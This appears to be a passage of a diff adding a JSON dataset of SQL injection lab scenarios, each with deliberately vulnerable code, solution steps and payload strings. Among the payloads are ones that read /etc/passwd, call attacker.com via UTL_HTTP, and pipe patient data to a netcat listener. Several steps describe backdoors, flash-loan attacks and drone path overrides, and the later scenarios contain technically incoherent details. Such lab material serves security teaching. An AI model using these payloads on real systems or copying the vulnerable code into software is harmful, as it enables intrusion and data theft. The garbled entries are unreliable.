+    "srcCode": "app.post('/login', (req, res) => {\n  const user = req.body.username;\n  const pass = req.body.password;\n  const sql = `SELECT * FROM employees WHERE username='${user}' AND password='${pass}'`;\n  db.query(sql, (err, result) => {\n    if (result.length > 0) res.send('Welcome!');\n    else res.status(401).send('Unauthorized');\n  });\n});",
+    "payloads": [
+      "' OR '1'='1",
+      "' UNION SELECT email FROM employees--"
+    ]
+  },
+  {
+    "Lab scenario": "Mobile API – SQL Injection in JSON Body Parameter",
+    "Lab Description": "The mobile application sends JSON data containing search filters. The backend fails to validate or sanitize the `title` parameter in the JSON body. An attacker could send a malicious JSON payload to inject arbitrary SQL into the backend and retrieve internal documents.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Send POST request: `{ \"title\": \"' OR 1=1--\" }`",
+      "Use injection to list confidential documents",
+      "Explore time-based and error-based techniques if needed"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/api/search', (req, res) => {\n  const title = req.body.title;\n  const sql = `SELECT * FROM docs WHERE title='${title}'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
+    "payloads": [
+      "' OR 1=1--",
+      "' UNION SELECT body FROM docs--"
+    ]
+  },
+  {
+    "Lab scenario": "Support Chat System – SQL Injection via Cookie Parameter",
+    "Lab Description": "The application identifies users using a session cookie that is directly passed to a SQL query. If an attacker modifies the cookie value to include SQL, it can be used to retrieve or manipulate chat history, impersonate another user, or drop session tables.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Capture cookie `session_id=abc123` and modify to `abc123' OR '1'='1`",
+      "Inject via Burp Suite or browser extension",
+      "Observe chat history from multiple users returned"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/chats', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const sql = `SELECT * FROM messages WHERE session_id='${sessionId}'`;\n  db.query(sql, (err, messages) => {\n    if (err) return res.status(500).send('Chat fetch failed');\n    res.json(messages);\n  });\n});",
+    "payloads": [
+      "abc123' OR '1'='1",
+      "xyz789' UNION SELECT content FROM logs--"
+    ]
+  },
+  {
+    "Lab scenario": "Banking API UNION-Based SQLi with Column Padding",
+    "Lab Description": "A financial transactions API endpoint directly incorporates unsanitized user input into ORDER BY clauses of PostgreSQL queries. The application returns verbose errors containing full query syntax and database structure. Attackers can bypass column count restrictions through NULL padding and explicit type casting to extract SHA-256 hashed PIN codes from the accounts table. The vulnerability stems from debug-mode error handling in production and lack of parameterized queries.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Intercept GET /transactions?sort=date request using Burp Suite",
+      "2. Determine column count: ' ORDER BY 7-- (observe error at ORDER BY 8)",
+      "3. Identify string-compatible columns: ' UNION SELECT NULL,'test',NULL,NULL,NULL,NULL,NULL--",
+      "4. Extract PIN hashes: ' UNION SELECT NULL,CAST(pin_hash AS TEXT),NULL,NULL,NULL,NULL,NULL FROM accounts--",
+      "5. Bypass WAF using URL-encoded whitespace (%09 for tabs)",
+      "6. Crack hashes using rainbow tables with banking-specific salts"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, amount, date, recipient, status, currency, user_id\n    FROM transactions\n    ORDER BY ${sort}`;\n\n  pool.query(query, (err, result) => {\n    if(err) {\n      res.status(500).send(`Query failed: ${query}\\n${err.stack}`); // Critical debug leak\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
+    "payloads": [
+      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL,NULL--",
+      "amount UNION SELECT NULL,current_setting('data_directory'),NULL,NULL,NULL,NULL,NULL--"
+    ]
+  },
+  {
+    "Lab scenario": "Medical Imaging System Error-Based SQLi in DICOM Metadata",
+    "Lab Description": "A hospital PACS system improperly handles DICOM metadata fields in MySQL INSERT statements. PatientName tags (0010,0010) containing SQL fragments trigger type conversion errors that leak radiation therapy records through verbose database exceptions. Attackers can exfiltrate treatment plans containing sensitive Protected Health Information (PHI) by manipulating VR (Value Representation) fields.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Craft DICOM file with malformed PatientName: ' OR 1=CAST((SELECT treatment_plan FROM radiation LIMIT 1) AS UNSIGNED)--",
+      "2. Upload via DICOM C-STORE protocol",
+      "3. Extract treatment details from MySQL error messages",
+      "4. Bypass DICOM validation using multi-value delimiters",
+      "5. Automate extraction using recursive CTE queries"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/dicom-upload', (req, res) => {\n  const patientName = extractDICOMTag(req.file, '00100010');\n  const query = `INSERT INTO studies\n    (patient_name, modality, study_date)\n    VALUES ('${patientName.replace(/'/g, \",\")}', 'CT', NOW())`;\n\n  pool.query(query, (err) => {\n    res.send(err ? 'DICOM Error' : 'Upload Success');\n  });\n});",
+    "payloads": [
+      "' UNION SELECT NULL,CONCAT(patient_id,':',treatment_date) FROM radiation--",
+      "' AND (SELECT COUNT(*) FROM radiation WHERE dose > 5000)=1--"
+    ]
+  },
+  {
+    "Lab scenario": "Blockchain Oracle SQLi with Signature Bypass",
+    "Lab Description": "A DeFi price oracle using EIP-712 signatures fails to validate query parameters in PostgreSQL. Attackers can forge signed requests to manipulate token prices through UNION injections in symbol parameterization. Vulnerability arises from improper separation of signing logic and SQL construction.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Reverse engineer EIP-712 type hash from contract ABI",
+      "2. Craft UNION payload: 'ETH' UNION SELECT 1500.00 AS price--",
+      "3. Generate valid signature using leaked nonce",
+      "4. Bypass median calculation through Sybil nodes",
+      "5. Execute flash loan arbitrage attacks"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/price', (req, res) => {\n  const { symbol, signature } = req.body;\n  const query = `SELECT price FROM ${symbol}_prices\n    WHERE block_number > 15438234`;\n\n  if (!validateSig(signature, query)) return res.status(403);\n  pool.query(query, (err, result) => {\n    res.json({ price: median(result.rows) });\n  });\n});",
+    "payloads": [
+      "ETH' UNION SELECT 1500.00 WHERE '1'='1'--",
+      "BTC' AND (SELECT COUNT(*) FROM nodes)>=3--"
+    ]
+  },
+  {
+    "Lab scenario": "Industrial PLC Code Injection via Modbus",
+    "Lab Description": "A PLC management interface processes Modbus FC23 messages with unsanitized register values in SQLite. Attackers can overwrite ladder logic through stacked queries containing CODESYS compiler commands. Vulnerability stems from mixing control logic storage with operational telemetry.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Capture Modbus/TCP traffic using Wireshark",
+      "2. Forge register write: '; UPDATE plc_code SET program=readfile('/tmp/backdoor.st')--",
+      "3. Bypass CRC using bitwise complement",
+      "4. Trigger recompilation via dummy register write",
+      "5. Verify backdoor installation"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "modbusServer.on('readWriteRegisters', (unit, reg, vals) => {\n  const value = vals.readFloatBE(0);\n  const query = `UPDATE iot_registers\n    SET value = ${value}\n    WHERE unit = ${unit} AND reg = ${reg}`;\n\n  db.run(query);\n});",
+    "payloads": [
+      "'; INSERT INTO plc_code VALUES ('malicious', x'4d5a')--",
+      "'; SELECT load_extension('exploit.dll')--"
+    ]
+  },
+  {
+    "Lab scenario": "Telecom SS7 MAP Protocol SQLi",
+    "Lab Description": "Mobile core network MAP interface improperly handles IMSI values in Oracle PL/SQL. Attackers can inject UNION payloads in UpdateLocation requests to exfiltrate subscriber SMS contents through SCCP routing bypass. Combines SS7 protocol weaknesses with dynamic SQL execution.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Spoof MAP UpdateLocation request",
+      "2. Inject IMSI: ' UNION SELECT sms_text FROM inbox--",
+      "3. Bypass SCCP GT translation",
+      "4. Intercept SMS delivery reports",
+      "5. Correlate TCAP transactions"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "CREATE PROCEDURE update_subscriber (\n  p_imsi VARCHAR2\n) IS\nBEGIN\n  EXECUTE IMMEDIATE 'SELECT msisdn FROM subs WHERE imsi='''||p_imsi||'''';\nEND;",
+    "payloads": [
+      "' UNION SELECT text FROM sms WHERE rownum=1--",
+      "'||UTL_HTTP.REQUEST('http://attacker.com/'||location)--"
+    ]
+  },
+  {
+    "Lab scenario": "Smart Contract Metadata SQLi",
+    "Lab Description": "NFT marketplace processes ERC-721 metadata with vulnerable JSONB queries in PostgreSQL. Attackers exploit JSON concatenation precedence to exfiltrate wallet keys through corrupted rarity scores. Vulnerability combines JSON operator precedence with lack of parameterization.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Mint NFT with malicious description",
+      "2. Trigger rarity calculation job",
+      "3. Exploit JSONB || operator precedence",
+      "4. Extract hex-encoded private keys",
+      "5. Convert to Ethereum addresses"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/calculate-rarity', (req, res) => {\n  const tokenId = req.body.id;\n  const query = `SELECT metadata->>'description' AS desc\n    FROM nfts WHERE token_id = ${tokenId}`;\n\n  pool.query(query, (err, result) => {\n    // Calculate rarity score\n  });\n});",
+    "payloads": [
+      "{\"description\":\"'||(SELECT ENCODE(private_key,'hex') FROM wallets)--\"}",
+      "{\"attributes\":[{\"value\":\"'||(SELECT version())--\"}]}"
+    ]
+  },
+  {
+    "Lab scenario": "Drone Navigation SQLi via MAVLink",
+    "Lab Description": "UAV ground control system processes MAVLink mission items with unsanitized parameters. Attackers inject coordinate updates through stacked queries to modify flight paths. Vulnerability stems from mixing navigation data storage with real-time control.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Spoof MAVLink system ID",
+      "2. Forge MISSION_ITEM packet",
+      "3. Bypass CRC via bitwise complement",
+      "4. Override geofence coordinates",
+      "5. Verify GPS spoofing"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "mavlinkServer.on('missionItem', (msg) => {\n  const query = `INSERT INTO flight_plan\n    (lat, lon) VALUES (${msg.x}, ${msg.y})`;\n  db.run(query);\n});",
+    "payloads": [
+      "35.6895); UPDATE waypoints SET lat=139.6917--",
+      "0; ATTACH DATABASE '/dev/mem' AS mem--"
+    ]
+  },
+  {
+    "Lab scenario": "Quantum Circuit SQLi in QASM",
+    "Lab Description": "Quantum compiler processes OpenQASM files with vulnerable creg names. Attackers inject SQL payloads to exfiltrate IBMQ credentials through transpilation errors. Combines quantum programming syntax with traditional SQLi.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1. Craft QASM with malicious creg",
+      "2. Submit via Qiskit API",
+      "3. Extract API keys from logs",
+      "4. Bypass Unicode validation",
+      "5. Hijack quantum compute time"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "def transpile(qasm):\n  name = extract_creg(qasm)\n  query = f\"SELECT mapping FROM layouts WHERE name='{name}'\"\n  db.execute(query);",
+    "payloads": [
+      "creg inject[8] = \"' UNION SELECT key FROM credentials--\"",
+      "opaque gate \u200B' OR 1=1--"
+    ]
+  },
+  {
+    "Lab scenario": "Healthcare Radiology SQLi",
+    "Lab Description": "Medical imaging system stores radiology notes in PostgreSQL with vulnerable plv8 functions. Attackers chain SQLi with JavaScript execution to leak DICOM files. Combines improper output encoding with excessive DB privileges.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Update notes with base64 payload",
+      "2. Trigger report generation",
+      "3. Exploit plv8.fetch()",
+      "4. Bypass CSP via COPY PROGRAM",
+      "5. Reconstruct DICOM files"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "app.post('/save-notes', (req, res) => {\n  const notes = req.body.notes;\n  const query = `UPDATE reports SET notes='${notes}'\n    WHERE id=${req.params.id}`;\n\n  pool.query(query);\n});",
+    "payloads": [
+      "'; CREATE TEMP TABLE exfil AS SELECT encode(dicom,'base64') FROM images--",
+      "'\\u0027; COPY (SELECT * FROM patients) TO PROGRAM 'nc attacker.com 4444'--"
+    ]
+  },
+  {
+    "Lab scenario": "Vehicle CAN Bus SQLi",
+    "Lab Description": "Telematics system processes J1939 messages with unsanitized PIDs in SQLite. Attackers forge OBD-II packets to overwrite firmware hashes. Vulnerability arises from mixing diagnostic data with update logic.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1. Capture CAN traffic",
+      "2. Forge J1939 message",
+      "3. Overflow firmware buffer",
+      "4. Bypass checksum",
+      "5. Trigger malicious update"
+    ],
+    "Vulnerability name": "SQL injection",
+    "srcCode": "canBus.on('message', (msg) => {\n  const pid = msg.id.toString(16);\n  const query = `INSERT INTO can_logs\n    (pid, data) VALUES ('${pid}', '${msg.data}')`;\n  db.run(query);\n});",
+    "payloads": [
+      "7DF UNION SELECT NULL,hex(readfile('/etc/passwd'))--",
+      "7E0; ATTACH DATABASE '/dev/mmcblk0' AS disk--"
+    ]
+  }
+]
